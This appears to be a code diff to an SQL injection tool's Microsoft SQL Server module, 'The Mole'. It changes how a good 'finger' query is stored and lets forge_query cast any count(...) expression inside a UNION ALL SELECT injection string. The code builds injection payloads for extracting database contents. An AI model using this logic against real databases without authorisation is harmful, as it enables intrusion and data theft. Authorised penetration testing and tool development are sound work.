@@ -23,6 +23,7 @@
 # Gastón Traberg
 
 from dbmsmoles import DbmsMole, FingerBase
+import re
 
 class MssqlMole(DbmsMole):
     out_delimiter_result = "::-::"
@@ -126,13 +127,13 @@ class MssqlMole(DbmsMole):
         return query
 
     def set_good_finger(self, finger):
-        self.query = finger
+        self.query = finger._query
 
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1 = 0 UNION ALL SELECT TOP 1 "
         query_list = list(self.query)
-        if fields == 'count(*)':
-            query_list[injectable_field] = (MssqlMole.out_delimiter + '+cast(count(*) as varchar(50))+' + MssqlMole.out_delimiter)
+        if re.search('count\([\w*]+\)', fields):
+            query_list[injectable_field] = (MssqlMole.out_delimiter + '+cast(' + fields + ' as varchar(50))+' + MssqlMole.out_delimiter)
             query += ','.join(query_list)
             return query + " from " + table_name + " where " + self.parse_condition(where)
         fields = self._concat_fields(fields.split(','))
